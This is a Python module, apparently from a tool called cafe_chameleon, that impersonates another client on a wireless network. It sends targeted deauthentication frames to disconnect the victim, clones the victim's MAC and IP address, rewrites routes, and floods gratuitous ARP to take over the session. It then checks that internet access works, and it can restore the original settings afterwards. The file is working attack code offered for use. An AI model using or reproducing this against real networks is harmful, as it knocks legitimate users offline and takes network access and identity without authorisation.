"""
cafe_chameleon.network.hijack - Network host impersonation and restoration procedures.
"""

import re
import time

from cafe_chameleon.utils.signals import HijackSkipInterrupt
from cafe_chameleon.utils.process import _run
from cafe_chameleon.utils.tracing import trace
from cafe_chameleon.ui.console import log_info, log_plus, log_hijack, log_step, log_wait
from cafe_chameleon.network.sysfs import wait_for_carrier, get_carrier_status
from cafe_chameleon.network.nmcli import get_active_profile
from cafe_chameleon.network.mac import set_mac_address, reset_mac_address
from cafe_chameleon.network.arp import send_gratuitous_arp, start_background_garp
from cafe_chameleon.network.deauth import send_deauth
from cafe_chameleon.network.internet import has_internet, test_internet_speed


def restore(interface: str, macaddress: str, ipmask: str, broadcast: str, gateway: str, profile: str | None = None) -> None:
    """Refined, fast network restoration procedure with link carrier synchronization and full NM cleanup."""
    trace(f"[FEATURE] Restoring network configuration on interface {interface} to MAC {macaddress}, IP {ipmask}, GW {gateway}")
    log_step(f"Restoring HW MAC & network settings on {interface}...")

    active_profile = profile or get_active_profile()
    if active_profile:
        _run(["nmcli", "connection", "modify", active_profile, "802-11-wireless.bssid", ""], debug=False)
        _run(["nmcli", "connection", "modify", active_profile, "802-11-wireless.cloned-mac-address", ""], debug=False)

    reset_mac_address(interface, profile=active_profile)

    # Force physical interface MAC hardware reset via macchanger -p
    _run(f"ip link set dev {interface} down", debug=False)
    _run(f"macchanger -p {interface}", debug=False)
    _run(f"ip link set dev {interface} up", debug=False)

    log_wait("Synchronizing adapter link...")
    wait_for_carrier(interface, timeout=4.0)

    try:
        _run(f"ip addr flush dev {interface}")
        _run(f"ip addr add {ipmask} broadcast {broadcast} dev {interface}")
    except Exception:
        pass

    try:
        _run(f"ip route flush dev {interface}")
        if gateway:
            _run(f"ip route replace default via {gateway} dev {interface} onlink")
    except Exception:
        pass

    if active_profile:
        log_wait(f"Reconnecting profile '{active_profile}'...")
        _run(["nmcli", "connection", "up", active_profile], debug=False, timeout=15.0)

    local_ip_only = ipmask.split("/")[0] if "/" in ipmask else ipmask
    if gateway and local_ip_only:
        try:
            send_gratuitous_arp(interface, local_ip_only, gateway)
        except Exception:
            pass

    log_plus("Restored original network configuration.")


def hijack(interface: str, ip: str, mac: str, netmask: str, broadcast: str, gateway: str, max_retries: int = 2, timeout_per_retry: float = 4, profile: str | None = None, bssid: str | None = None, channel: int | None = None) -> bool:
    """
    High-reliability network connection procedure.
    """
    trace(f"[FEATURE] Initiating host impersonation/hijack on interface {interface} targeting {ip} ({mac})")
    log_hijack(f"[*] Impersonating host {ip} ({mac})...")
    active_profile = profile or get_active_profile()

    try:
        # 0. Send targeted MDK4 Deauth/Disassoc in Monitor Mode
        send_deauth(mac, bssid, interface, channel=channel)

        for attempt in range(1, max_retries + 1):
            if active_profile:
                log_hijack(f"[*] Spoofing MAC -> {mac}...")
            mac_ok = set_mac_address(interface, mac, profile=active_profile)
            if not mac_ok:
                log_hijack(f"\033[91m[-] MAC spoof failed -> {mac}\033[0m")

            log_hijack(f"[*] Syncing link carrier on {interface}...")
            carrier_ok = wait_for_carrier(interface, timeout=5.0, poll_interval=0.05)
            if not carrier_ok:
                log_hijack(f"\033[91m[-] Carrier down on {interface}, recovering...\033[0m")
                _run(f"ip link set dev {interface} up", debug=False)
                if active_profile:
                    _run(["nmcli", "device", "wifi", "rescan"], debug=False)
                    _run(["nmcli", "connection", "up", active_profile], debug=False, timeout=15.0)
                carrier_ok = wait_for_carrier(interface, timeout=3.0, poll_interval=0.05)

            log_hijack(f"[*] Configuring IP ({ip}/{netmask}) & route...")
            _run(f"ip addr flush dev {interface} scope global")
            rc_ip, ip_err = _run(f"ip -4 addr add {ip}/{netmask} broadcast {broadcast} dev {interface}")
            if rc_ip != 0:
                log_hijack(f"\033[91m[-] IP assign failed -> {ip}/{netmask}\033[0m")

            try:
                _run(f"ip route flush dev {interface}")
                if gateway:
                    rc_rt, rt_err = _run(f"ip route replace default via {gateway} dev {interface} onlink")
                    if rc_rt != 0:
                        log_hijack(f"\033[91m[-] Route failed via {gateway}\033[0m")
            except Exception as e:
                log_hijack(f"[-] Route error: {e}")

            garp_stop_event = None
            if gateway:
                log_hijack("[*] Broadcasting Gratuitous ARP...")
                send_gratuitous_arp(interface, ip, gateway)
                garp_stop_event = start_background_garp(interface, ip, gateway)

            try:
                log_hijack("[*] Verifying interface state & connectivity...")
                start_time = time.time()
                verified = False
                last_mac_ok, last_ip_ok, last_conn_ok = False, False, False

                while time.time() - start_time < timeout_per_retry:
                    current_mac = None
                    try:
                        with open(f"/sys/class/net/{interface}/address", "r") as f:
                            current_mac = f.read().strip().lower()
                    except Exception:
                        rc, mac_out = _run(f"macchanger -s {interface}", debug=False)
                        m = re.search(r"Current MAC:\s+([0-9a-fa-f:]+)", mac_out, re.IGNORECASE)
                        if m:
                            current_mac = m.group(1).lower()
                    last_mac_ok = (current_mac == mac.lower()) if current_mac else False

                    rc, if_out = _run(f"ip addr show dev {interface}", debug=False)
                    last_ip_ok = (f"inet {ip}/" in if_out) or (f"inet {ip} " in if_out)
                    last_conn_ok = get_carrier_status(interface)

                    if last_mac_ok and last_ip_ok and last_conn_ok:
                        verified = True
                        break

                    time.sleep(0.2)

                if not verified:
                    log_hijack(
                        f"\033[91m[-] Interface verify failed ({attempt}/{max_retries}) "
                        f"[MAC:{last_mac_ok} IP:{last_ip_ok} LINK:{last_conn_ok}]\033[0m"
                    )
                else:
                    log_hijack("[*] Interface ready. Testing internet...")
                    has_base = has_internet(timeout=1.0, check_speed=False)
                    if not has_base:
                        log_hijack("\033[91m[-] Unreachable (Gateway/DNS failed)\033[0m")
                        return False

                    log_hijack("[*] Link active. Measuring speed...")
                    is_fast, speed_val = test_internet_speed(timeout=1.5, min_speed_kbps=5.0)
                    if is_fast:
                        log_hijack(f"\033[92m[+] SUCCESS! Verified [{speed_val:.1f} KB/s]\033[0m")
                        return True
                    else:
                        if speed_val > 0:
                            log_hijack(f"\033[91m[-] Slow connection [{speed_val:.1f} KB/s < 5.0 KB/s]\033[0m")
                        else:
                            log_hijack("\033[91m[-] Connection timeout [0.0 KB/s]\033[0m")
                        return False
            finally:
                if garp_stop_event:
                    garp_stop_event.set()

            if attempt < max_retries:
                time.sleep(0.5)
    except HijackSkipInterrupt:
        log_hijack(f"\033[93m[-] Skipped host {ip} ({mac})\033[0m")
        return False

    log_hijack(f"\033[91m[-] Impersonation failed -> {ip} ({mac})\033[0m")
    return False

